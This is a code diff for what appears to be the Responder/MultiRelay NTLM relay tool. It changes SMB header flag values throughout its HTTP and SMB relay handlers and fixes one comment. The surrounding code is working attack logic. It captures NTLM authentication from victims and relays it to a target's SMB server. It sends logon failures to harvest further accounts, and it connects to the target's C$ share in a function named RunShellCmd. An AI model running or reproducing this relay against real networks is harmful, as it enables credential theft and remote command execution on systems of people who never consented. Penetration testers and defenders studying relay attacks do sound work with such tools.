@@ -225,7 +225,7 @@ class HTTPProxyRelay(BaseRequestHandler):
 
 		if Packet_NTLM == "\x01":
                     ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
-                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
+                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
                     n = SMBNegoCairo(Data = SMBNegoCairoData())
                     n.calculate()
                     packet0 = str(h)+str(n)
@@ -234,7 +234,7 @@ class HTTPProxyRelay(BaseRequestHandler):
                     smbdata = s.recv(2048)
                     ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                     if smbdata[8:10] == "\x72\x00":
-                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
+                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
                         t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                         t.calculate()
                         packet1 = str(head)+str(t)
@@ -265,7 +265,7 @@ class HTTPProxyRelay(BaseRequestHandler):
                             Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
 
                             if Username is not None:
-                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
+                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                 t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                 t.calculate()
                                 packet1 = str(head)+str(t)
@@ -322,7 +322,7 @@ class HTTPRelay(BaseRequestHandler):
 
 		if Packet_NTLM == "\x01":
                     ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
-                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
+                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
                     n = SMBNegoCairo(Data = SMBNegoCairoData())
                     n.calculate()
                     packet0 = str(h)+str(n)
@@ -331,7 +331,7 @@ class HTTPRelay(BaseRequestHandler):
                     smbdata = s.recv(2048)
                     ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                     if smbdata[8:10] == "\x72\x00":
-                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
+                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
                         t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                         t.calculate()
                         packet1 = str(head)+str(t)
@@ -362,7 +362,7 @@ class HTTPRelay(BaseRequestHandler):
                             Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host[0],Pivoting)
 
                             if Username is not None:
-                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
+                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                 t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                 t.calculate()
                                 packet1 = str(head)+str(t)
@@ -377,7 +377,7 @@ class HTTPRelay(BaseRequestHandler):
                                    return None
 
 	    else:
-                ##Any other type of request, send a 407.
+                ##Any other type of request, send a 401.
                 Response = IIS_Auth_401_Ans()
 	        self.request.send(str(Response))
 
@@ -404,7 +404,7 @@ class SMBRelay(BaseRequestHandler):
 
             ##Negotiate proto answer. That's us.
             if data[8:10] == "\x72\x00":
-                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc7", pid=pidcalc(data),mid=midcalc(data))
+                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x43\xc8", pid=pidcalc(data),mid=midcalc(data))
                 t = SMBRelayNegoAns(Dialect=Parse_Nego_Dialect(data))
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1
@@ -420,7 +420,7 @@ class SMBRelay(BaseRequestHandler):
             if data.find("NTLM") is not -1:
                 ##Relay all that to our client.
                 if data[8:10] == "\x73\x00":
-                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
+                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                    #NTLMv2 MIC calculation is a concat of all 3 NTLM (nego,challenge,auth) messages exchange.
                    #Then simply grab the whole session setup packet except the smb header from the client and pass it to the server.
                    t = smbdata[36:]
@@ -435,7 +435,7 @@ class SMBRelay(BaseRequestHandler):
 
             if IsSMBAnonymous(data):
                 ##Send logon failure for anonymous logins.
-                head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
+                head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                 t = SMBSessEmpty()
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1
@@ -449,7 +449,7 @@ class SMBRelay(BaseRequestHandler):
                 Username, Domain = ParseSMBHash(data,self.client_address[0],challenge,UserToRelay,Host[0],Pivoting)
                 if Username is not None:
                     ##Got the ntlm message 3, send it over to SMB.
-                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
+                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",uid=smbdata[32:34],mid="\x03\x00")
                     t = data[36:]#Final relay.
                     packet1 = str(head)+str(t)
                     buffer1 = longueur(packet1)+packet1
@@ -470,7 +470,7 @@ class SMBRelay(BaseRequestHandler):
 
                 else:
                    ##Send logon failure, so our client might authenticate with another account.
-                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
+                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x43\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                    t = SMBSessEmpty()
                    packet1 = str(head)+str(t)
                    buffer1 = longueur(packet1)+packet1
@@ -520,7 +520,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
     ## Tree Connect
     if data[8:10] == "\x73\x00":
         GetSessionResponseFlags(data)#While at it, verify if the target has returned a guest session.
-        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x43\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
         t = SMBTreeConnectData(Path="\\\\"+Target[0]+"\\C$")
         t.calculate()
         packet1 = str(head)+str(t)
